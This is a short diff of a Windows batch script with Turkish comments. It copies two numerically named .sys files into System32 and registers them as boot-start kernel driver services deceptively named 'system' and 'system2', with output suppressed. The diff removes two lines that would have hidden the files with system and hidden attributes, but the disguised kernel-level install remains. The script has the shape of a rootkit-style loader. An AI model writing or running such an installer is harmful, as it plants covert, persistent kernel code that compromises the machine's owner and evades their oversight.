@@ -27,10 +27,6 @@ if exist "%~dp086436432.sys" (
     copy /y "%~dp086436432.sys" "%sys32Dir%"
 )
 
-:: Dosyaları sistem dosyası olarak ayarla ve gizle
-attrib +s +h "%sys32Dir%\53259239.sys"
-attrib +s +h "%sys32Dir%\86436432.sys"
-
 :: Yeni servisleri oluştur (System32 klasöründen çalıştırılacak şekilde)
 sc create system binPath= "C:\Windows\System32\53259239.sys" DisplayName= "system" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
 sc create system2 binPath= "C:\Windows\System32\86436432.sys" DisplayName= "system2" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1
